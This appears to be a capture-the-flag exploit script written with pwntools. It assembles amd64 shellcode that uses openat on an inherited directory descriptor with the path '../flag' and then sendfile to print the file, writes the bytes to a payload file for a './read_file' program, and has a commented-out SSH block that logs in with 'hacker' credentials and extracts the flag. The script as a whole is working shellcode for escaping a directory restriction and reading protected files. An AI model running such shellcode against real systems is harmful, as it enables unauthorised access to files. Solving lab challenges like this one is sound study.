import os
import paramiko
from base64 import b64encode
from pwn import *
import sys
import re
import os

#ssh = paramiko.SSHClient()
#ssh.connect(sys.argv[1], port=sys.argv[2], username='hacker', password='hacker')

context.arch = 'amd64'

shellcode = '''
mov rax, %d
push rax

mov rdi, 3
mov rsi, rsp
mov rdx, 0
mov r10, 0
mov rax, 0x101
syscall

mov rdi, 1
mov rsi, 4
mov rdx, 0
mov r10, 0x50
mov rax, 0x28
syscall
''' % u64('../flag\0')

payload = asm(shellcode)
#payload = b64encode(payload).decode()

with open('payload', 'wb') as f:
	f.write(payload)
command = './read_file < payload 3< /tmp'
print(command)
'''
stdin, stdout, stderr = ssh.exec_command('echo %s | base64 -d | payload 3< /flag' % payload)

output = stdout.read()
output = io.recv()
flag = re.findall('^FLAG{[0-9a-zA-Z_]+}$', output)[0]
print(flag)
'''
